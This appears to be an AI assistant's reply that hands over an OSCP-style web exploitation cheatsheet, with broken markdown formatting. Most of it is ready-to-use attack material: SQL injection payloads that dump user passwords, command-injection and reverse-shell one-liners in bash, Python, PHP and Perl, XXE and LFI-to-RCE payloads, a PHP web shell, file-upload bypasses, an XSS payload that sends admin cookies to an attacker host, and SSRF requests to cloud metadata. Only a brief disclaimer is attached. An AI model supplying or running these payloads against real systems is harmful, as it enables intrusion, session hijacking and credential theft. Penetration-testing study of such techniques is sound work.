Of course. Here is a comprehensive guide and cheatsheet for web application exploitation, tailored for an OSCP-level approach, provided as a single Markdown code block.
Markdown

# OSCP Web Exploitation Guide & Cheatsheet 🕷️

This guide provides a structured methodology and quick-reference commands for common web application vulnerabilities encountered in OSCP-like environments.**Disclaimer:** This information is for educational and ethical security research purposes only. Only test these techniques on systems you own or have explicit, written permission to assess.

---## 1. Foundation: Reconnaissance & Enumeration

Never underestimate this phase. Thorough enumeration is often the key to finding a foothold.### **A. Initial Scans (Nmap)**

Identify running web servers and their versions.```bash
# Fast scan for top ports, service version detection, default scripts
nmap -sC -sV -p- -T4 --min-rate=1000 -oN nmap_initial.txt <TARGET_IP>

# Scan for all TCP ports (slower)
nmap -p- -sV -oN nmap_full_tcp.txt <TARGET_IP>
B. Directory & File Brute-Forcing (Gobuster / Feroxbuster)
Find hidden pages, directories, and endpoints.
Bash

# Gobuster - Common directories
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,bak -t 50# Feroxbuster - Recursive search with more features
feroxbuster -u http://<TARGET_IP> -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,html,js,json
C. Subdomain Enumeration (ffuf)
Discover virtual hosts and subdomains.
Bash

# Brute-force subdomains using a wordlist
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://<TARGET_IP> -H "Host: FUZZ.target.com" -fs <SIZE_OF_DEFAULT_RESPONSE>
D. Technology Stack Identification
Use browser plugins like Wappalyzer or command-line tools like whatweb.
Bash

whatweb http://<TARGET_IP>
2. Common Injection Vulnerabilities
A. SQL Injection (SQLi)
Identification:

Look for parameters in the URL (?id=1) or POST data.
Test with ', ", sleep(), and boolean conditions. id=1' , id=1", id=1 AND 1=1, id=1 AND 1=2.
Check for differences in the page response.
Manual Exploitation (Union-based):

Find number of columns: ' ORDER BY 1--, ' ORDER BY 2--, etc., until an error occurs.
Find usable columns: ' UNION SELECT 1,2,3,NULL-- (adjust numbers to match column count).
Extract data:
' UNION SELECT 1,database(),user(),4--
' UNION SELECT 1,group_concat(table_name),3,4 FROM information_schema.tables WHERE table_schema=database()--
' UNION SELECT 1,group_concat(column_name),3,4 FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT 1,group_concat(username,':',password),3,4 FROM users--
Automated Exploitation (sqlmap):
Bash

# Basic GET request
sqlmap -u "http://<TARGET_IP>/vuln.php?id=1" --dbs# POST request
sqlmap -u "http://<TARGET_IP>/login" --data="user=admin&pass=123" --dbs# Get tables from a database
sqlmap -u "http://<TARGET_IP>/vuln.php?id=1" -D <DB_NAME> --tables# Dump a table
sqlmap -u "http://<TARGET_IP>/vuln.php?id=1" -D <DB_NAME> -T <TABLE_NAME> --dump# Get an OS shell
sqlmap -u "http://<TARGET_IP>/vuln.php?id=1" --os-shell
B. Command Injection
Identification:

Look for functionality that interacts with the underlying OS (e.g., ping tools, file converters, network lookups).
Inject command separators: ;, &&, |, ||.
Test with whoami, id, ls -la, ping -c 3 <ATTACKER_IP>.
Payloads:

8.8.8.8; whoami
8.8.8.8 && ls -la /
| nc <ATTACKER_IP> 4444 -e /bin/bash (for a reverse shell).
C. XML External Entity (XXE)
Identification:

Look for applications that parse XML input (e.g., file uploads that accept .xml, POST bodies with Content-Type: application/xml).
Payload to read /etc/passwd:
XML

<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE user [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><user>
  <username>&xxe;</username>
  <password>password</password></user>
SSRF via XXE:
XML

<!DOCTYPE user [ <!ENTITY xxe SYSTEM "[http://169.254.169.254/latest/meta-data/](http://169.254.169.254/latest/meta-data/)"> ]>
3. File & Path Manipulation
A. Local File Inclusion (LFI) / Directory Traversal
Identification:

Look for parameters that include filenames, like ?page=main.php or ?file=user_guide.pdf.
Payloads:

Traversal: ../../../../../../../../etc/passwd
Null Byte (for older PHP): ../../../../etc/passwd%00
PHP Wrappers:
php://filter/convert.base64-encode/resource=index.php (Read source code)
php://input (with POST data for RCE: <?php system($_GET['cmd']); ?>)
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+ (Base64 for <?php system($_GET['cmd']); ?>)
LFI to RCE (Log Poisoning):

Inject PHP code into a log file that you can access via LFI (e.g., Apache logs).
Make a request to the server with PHP code in the User-Agent string or URL. nc <TARGET_IP> 80 GET /<?php system($_GET['cmd']); ?> HTTP/1.1 Host: <TARGET_IP> User-Agent: <?php system($_GET['cmd']); ?>
Include the log file via LFI and pass your command. http://<TARGET_IP>/index.php?page=../../../../var/log/apache2/access.log&cmd=whoami
B. Remote File Inclusion (RFI)
Identification:

Similar to LFI, but the application includes a full URL, e.g., ?include=[http://example.com/widget.php](http://example.com/widget.php).
Exploitation:

Host a PHP reverse shell script on your attacker machine.
http://<TARGET_IP>/?page=http://<ATTACKER_IP>/shell.php
C. File Upload Vulnerabilities
Goal: Upload a web shell (.php, .jsp, .aspx) and execute it.
Bypass Techniques:

Change extension: shell.php -> shell.php5, shell.phtml
Add valid extension: shell.jpg.php (if it checks only the first extension).
Change Content-Type header: Set Content-Type: image/jpeg in Burp Suite for a PHP file.
Use magic bytes: Add GIF89a; to the very beginning of your PHP shell file.
Null byte injection: shell.php%00.jpg
4. Cross-Site Scripting (XSS)
While often low-impact in bug bounties, for OSCP, XSS is a great way to steal admin cookies.
Identification:

Input user-controllable data into any field (search bars, comments, profile info).
Test with simple payloads: <script>alert(1)</script>, "><img src=x onerror=alert(1)>
Exploitation (Cookie Stealing):

Start a listener on your attacker machine to catch the cookie.
Bash

nc -lvnp 80
Craft the payload.
JavaScript

<script>document.location='http://<ATTACKER_IP>/cookie_stealer.php?c=' + document.cookie;</script>
Inject the payload where an admin user will view it (e.g., a support ticket form).
When the admin views the page, their browser will execute the script, sending their session cookie to your listener.
Use the stolen cookie in your browser (e.g., with the "Cookie-Editor" extension) to hijack the admin's session.
5. Server-Side Request Forgery (SSRF)
Identification:

Functionality that fetches data from a URL provided by the user (e.g., image upload from URL, PDF generators).
Look for parameters like ?url=, ?uri=, ?path=.
Exploitation:

Internal Port Scanning:
http://<TARGET_IP>/vuln?url=[http://127.0.0.1:22](http://127.0.0.1:22)
http://<TARGET_IP>/vuln?url=[http://127.0.0.1:8080](http://127.0.0.1:8080)
(Observe response time differences or error messages).
Accessing Cloud Metadata:
[http://169.254.169.254/latest/meta-data/](http://169.254.169.254/latest/meta-data/) (AWS)
[http://169.254.169.254/metadata/v1/](http://169.254.169.254/metadata/v1/) (Google Cloud)
Using different schemas: file:///etc/passwd, dict://, gopher://
6. Post-Exploitation & Shells
Getting a shell is the goal. Always have a listener ready.
Netcat Listener
Bash

nc -lvnp <PORT>
Reverse Shell Cheatsheet
Bash:
Bash

bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1
Python:
Python

python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ATTACKER_IP>",<PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'







PHP:
PHP

php -r '$sock=fsockopen("<ATTACKER_IP>",<PORT>);exec("/bin/sh -i <&3 >&3 2>&3");'
A common web shell to upload:
PHP

<?php system($_GET['cmd']); ?>
Perl:
Perl

perl -e 'use Socket;$i="<ATTACKER_IP>";$p=<PORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
Stabilizing the Shell
Upgrade your dumb nc shell to a fully interactive TTY.

python -c 'import pty; pty.spawn("/bin/bash")' (or python3)
Ctrl+Z (to background the shell)
stty raw -echo; fg
reset
export SHELL=bash
export TERM=xterm-256color
Adjust terminal size: stty rows <num> cols <num>
Internal Enumeration (Post-Shell)
Once you have a shell, run enumeration scripts to find privesc vectors.

Host the script on your machine: python3 -m http.server 80
Download it on the target: wget http://<ATTACKER_IP>/linpeas.sh or curl http://<ATTACKER_IP>/linpeas.sh -o linpeas.sh
Make it executable and run: chmod +x linpeas.sh then ./linpeas.sh
